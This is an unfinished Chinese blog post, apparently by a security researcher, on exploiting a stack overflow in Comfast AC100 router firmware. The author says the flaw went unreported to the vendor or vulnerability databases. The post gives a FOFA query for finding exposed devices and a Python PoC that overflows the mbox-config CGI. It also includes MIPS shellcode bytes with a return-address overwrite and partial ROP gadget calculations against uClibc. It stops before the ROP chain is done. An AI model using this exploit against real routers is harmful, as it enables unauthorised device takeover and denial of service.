---
title: Comfast 系列产品 /栈溢出通用利用链构造 - 更新1
published: true
---

(未完结) Comfast 本身是个比较小众品牌，出的洞危害范围较小，其安全防御措施也较为轻松，没什么交漏洞库和提醒厂商的必要，没什么好说的.    

不过看到网上关于他的漏洞，都没有写明合适构造链. 因此在此浅浅分析一下几条从栈溢出到 RCE 的普通/特殊利用链就行了，没困难可以创造困难哎！

fofa语法:  
```
icon_hash="-1026040476"
```

# [](#header-3)构造

一个尚未公开的栈溢出PoC(前提是登录，客户端 IP 被服务端记录在案):
```py
def Vul4_AC100(host: str) -> None:
	'''
	Stack OverFlow & DDoS
	Requirement: Authorized
    by leeya_bug
	'''
	import requests
    data0 = 'A' * 500
	data = '{"portal_delete_picname":"' + data0 + '"}'
	requests.post("http://" + host + "/cgi-bin/mbox-config?method=SET&section=wifilith_delete_pic_file", data = data)

Vul4_AC100(HOST的地址)
```

笔者在此已经下载到了该厂商的一个通用网关固件，将其模拟起来并成功复现了该漏洞. 由于该厂商大多数产品都是通用固件的模板复用，因此只要有洞那大概率其他固件也能复现   
下载链接如下所示，提取文件系统可以发现就是 nginx + web cgi

[https://dl.comfast.cn/firmware/CF-AC100-V2.6.0.8.zip](https://dl.comfast.cn/firmware/CF-AC100-V2.6.0.8.zip)

首先用 cyclic 生成 De Bruijn 序列探测一下返回地址是什么  

```sh
$ cyclic 500
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaae
```

将 PoC 中 data0 改成以上 De Bruijn 序列，然后调试模式运行到下断点处  

此时已知：  
栈上字符串变量的首地址为 0x2B2A6540  
De Bruijn 字符串的首地址为 0x2B2A655C

运行到函数结束，PC跳到返回地址

![/image/cfac100_1.png](/image/cfac100_1.png)  

跳到的地址 0x6361616C 正好是 caal，也正好是 De Brujin 字符串的第 244 - 248 个字节，在栈中地址为 0x2B2A6650. 接下来更改该序列：  
1. 首先，更改栈返回地址将程序跳转至 0x2B2A6654，具体跳到哪里无所谓，只要跳到 `addiu $a0, $zero, 0x457` * 0xff 这个区间里面的任意地址就行. 
2. 而后继续写下 0xff 个填充指令 `addiu $a0, $zero, 0x457` 用于缓冲  
3. 准备完毕后，构造命令的执行 Payload，并将构建完毕的 Payload 接入填充指令的尾部，进而后续执行(0x2B4002F0 是 system 函数的地址，此处未开启栈随机化，因此暂时拿 0x2B4002F0 作为其地址)  
	```mips
	li 	$a0, 0x2B2A7A58
	li 	$t9, 0x2B4002F0
	jalr $t9
	```
4. 写入要执行的命令，例如 `mkdir /12345`，在此处是不得手动添加 `\x00` 在末尾的

测试版本的 Shellcode 如下所示

```python
data0  = b'A' * 248
data0 += (0x2B2A7660).to_bytes(4, 'little')
data0 += b'A' * 0xff0
data0 += b"\x57\x04\x04\x24" * 0xff			#写入 addiu $a0, $zero, 0x457
data0 += b"\x2a\x2b\x04\x3c\x58\x7a\x84\x34\x40\x2b\x19\x3c\xf0\x02\x39\x37\x09\xf8\x20\x03"
data0 += b"mkdir /12345"
```

可以发现PC成功跳转，但是继续运行就报错！这是为什么？后续经 checksec 才发现，Comfast 最新版本的固件居然开启了 NX 保护，因此现在无法在栈上执行任何代码了(明明之前还没开的)

(`li $a0, 0x457` 即为 `addiu $a0, $zero, 0x457`)

![/image/cfac100/2.png](/image/cfac100/2.png)  

![/image/cfac100/3.png](/image/cfac100/3.png)  

不过这倒无所谓，换种方法继续构造罢了  

# [](#header-3)ROP

此时我们的目标是跳到位于 0x2B4002F0 的 system 函数中(如下图所示，此处未开启栈随机化，因此暂时拿 0x2B4002F0 作为其地址). 

![/image/cfac100/3.png](/image/cfac100/4.png)  

由于此处我们无法直接控制 $a0 寄存器，不能够直接跳转到 system 函数中. 因此这里就要找两个 gadget，一个用来控制传参的 $s0 寄存器，一个用来控制 jalr 跳转到的 $t9 寄存器

该固件直接加载 ld-uClibc-0.9.33.2.so，因此直接分析 uClibc 中的 ROP gadget 即可. 

简单在 uClibc 中使用 mips gadget 找寻工具利用 mipsrop.find 了一下，发现了两条十分完美的 gadget: 

`mipsrop.find("move $t9")` 

![/image/cfac100/3.png](/image/cfac100/8.png)  

1. 第一条在 uClibc 中的地址为 0x4C08，能控制 $s0 - $s7 之间的寄存器，并且其偏移地址为 0x180，远大于下下图所示的 0x12C，是十分理想的在此用来控制寄存器的 gadget.  
   我们先让 PC 跳到这条 gadget 的起始地址 0x4C08
   
	![/image/cfac100/3.png](/image/cfac100/5.png)  
	![/image/cfac100/3.png](/image/cfac100/6.png)  

2. 第二条在 uClibc 中的地址为 0x53B4，首先 move $t9, $s5，而后旋即 jalr 到 $t9，我不得不承认 uClibc 中的这两条 gadget 搭配起来简直是天衣无缝.  
   我们将上面那条 gadget 的 $ra 设置为 该条 gadget 的起始地址 0x53B4，方便 PC 跳到该 gadget
   
   ![/image/cfac100/3.png](/image/cfac100/7.png)     

接下来写代码：首先根据偏移量，计算两条 gadget 的位置
```py
# 0x2B2B2550 		是 __uClibc_main 函数的起始地址
# 0x68				是 __uClibc_main 函数起始至 __uClibc_main 函数末尾指令 jr $t9 的距离
# 0x65B8			是 __uClibc_main 函数在 ld-uClibc-0.9.33.2.so 中指令 jr $t9 的地址

# jalr $t9
gadget_jalr_addr 	= 0x2B2B2550 + 0x68 - (0x65B8 - 0x53B4)
# $s0 - $s7
gadget_addr 		= 0x2B2B2550 + 0x68 - (0x65B8 - 0x40C8)
```

再通过 cyclic 生成 De Bruijn 序列探测一下各寄存器的赋值位置：

由于时间很晚，并且这段时间本人很忙，明天再更新